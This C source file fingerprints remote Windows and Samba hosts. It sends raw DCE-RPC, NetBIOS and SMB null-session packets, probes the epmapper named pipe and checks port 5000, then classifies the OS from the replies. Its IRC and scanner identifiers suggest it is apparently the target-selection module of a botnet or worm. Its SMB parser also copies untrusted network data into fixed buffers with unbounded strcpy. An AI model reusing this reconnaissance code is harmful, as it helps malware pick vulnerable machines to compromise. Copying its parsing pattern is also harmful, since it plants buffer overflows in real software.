#include "vPOEb.h"
#include "vInclude.h"
#include "vExterns.h"
#include "vFPHost.h"

char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";

char sessionrequest[]=
	"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
	"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"
	"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x41\x41\x00";

char negotiate[]=
	"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"
	"\x31\x32\x00";

char setupaccount[]=
	"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b"
	"\x00\x00\x00\x6e\x74\00\x70\x79\x73\x6d\x62\x00";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];
	    
			int iRetVal=OS_UNKNOWN;
			int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;
	    
			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=htons(135); 
			ssin.sin_addr.s_addr=vPOEb->vIRC.ResolveAddress((char *)szHost);
	    
			int iErr=connect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {	
				iErr=send(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				iErr=recv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {	
					iErr=send(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) { 
						closesocket(sSocket); 
						return iRetVal; 
					}
					iErr=recv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) { 
						closesocket(sSocket); 
						return iRetVal; 
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {	
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {	
							if(iErr<300) 
								iRetVal=OS_WINNT; 
							else 
								iRetVal=OS_WIN2K; 
						} else 
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN; 
					} else {	
						closesocket(sSocket); 
						return iRetVal; 
					} 
				} else {	
					closesocket(sSocket); 
					return iRetVal; 
				} 
			} else {	
				closesocket(sSocket); 
				return iRetVal; 
			}
			closesocket(sSocket); 
			return iRetVal; 
		}
		break;
	case FP_PORT5K:
		if(vPOEb->vPOEscan.ConnectPortOpen(inet_addr(szHost), 5000)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	case FP_SMB:
		{
			// From THCsmbgetOS.c
			int iRetVal=OS_UNKNOWN, iRecvd;
			BOOL bOkToParse=FALSE;

			int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;

			char szRecvBuf[8192];
			char sWorkgroup[512], sServer[512], sOS[512];

			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=htons(139); 
			ssin.sin_addr.s_addr=vPOEb->vIRC.ResolveAddress((char *)szHost);
	    
			int iErr=connect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {

				iErr=send(sSocket, sessionrequest, sizeof(sessionrequest)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				iErr=recv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=send(sSocket, negotiate, sizeof(negotiate)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				iErr=recv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=send(sSocket, setupaccount, sizeof(setupaccount)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				iErr=recv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					closesocket(sSocket); 
					return iRetVal; 
				}
				iRecvd=iErr;

				int iZeroCounter=0; iRecvd--;
				while((--iRecvd>0)&&(iZeroCounter<4))
				{
					if(szRecvBuf[iRecvd]==0x00)
					{
						switch(iZeroCounter)
						{
							case 0: strcpy(sWorkgroup,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 1: strcpy(sServer,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 2: strcpy(sOS,(char*)&(szRecvBuf[iRecvd+1])); break;
							default: break;
						}
						iZeroCounter++;
					}
				}
				bOkToParse=TRUE;

			} else {
				return iRetVal;
			}
			closesocket(sSocket); 
			if(bOkToParse)
			{
				// Windows 2003 gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN1
				// Windows Server 2003 5.2
				// Windows Server 2003 3790
				if (wildcmp("Windows Server 2003 *.*",sServer))
					return OS_WIN2K3;

				// Windows NT gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN2
				// NT LAN Manager 4.0
				// Windows NT 4.0
				if (wildcmp("NT LAN Manager *.*",sServer))
					return OS_WINNT;

				// Windows 2k gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN3
				// Windows 2000 LAN Manager
				// Windows 5.0
				if (wildcmp("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.0",sOS))
						return OS_WIN2K;
					
				// Windows XP gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN4
				// Windows 2000 LAN Manager
				// Windows 5.1
				if (wildcmp("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.1",sOS))
						return OS_WINXP;

				// Samba gives me:
				// Remote OS:
				// ----------
				// SAMBADOMAIN1
				// Samba 2.0.7
				// Unix
				if (wildcmp("Samba *",sServer))
					return OS_LINUX;
			}

			return iRetVal;
		}
		break;
	case FP_NP:
		{
			char szPipePath[MAX_PATH];
			int iRetVal=OS_UNKNOWN;
			//sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", szHost);
			_snprintf(szPipePath,sizeof(szPipePath),"\\\\%s\\",szHost);
			strncat(szPipePath,"pipe\\epmapper",sizeof(szPipePath));
			HANDLE hFile=CreateFile(szPipePath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);
			if(hFile!=INVALID_HANDLE_VALUE)
			{	
				//unsigned long lWritten;
				char *szInBuf=(char*)malloc(100000);
				memset(szInBuf, 0, 100000);
				
				DWORD dwRead;
				TransactNamedPipe(hFile, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, szInBuf, 10000, &dwRead, NULL);
				if(szInBuf[2]==DCE_PKT_BINDACK)
				{
					TransactNamedPipe(hFile, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1, szInBuf, 10000, &dwRead, NULL);
					if(szInBuf[2]==DCE_PKT_RESPONSE)
					{
						if (MemContains(szInBuf, dwRead, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
						{
							if(dwRead<300)
								iRetVal=OS_WINNT;
							else
								iRetVal=OS_WIN2K;
						}
						else if (MemContains(szInBuf, dwRead, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
							iRetVal=OS_WINXP;
						else
							iRetVal=OS_UNKNOWN;
					}
				}
				free(szInBuf);
				CloseHandle(hFile);
			}
			return iRetVal;
		}
		break;

	default:
		return OS_UNKNOWN;
		break; 
	}
	return OS_UNKNOWN;
}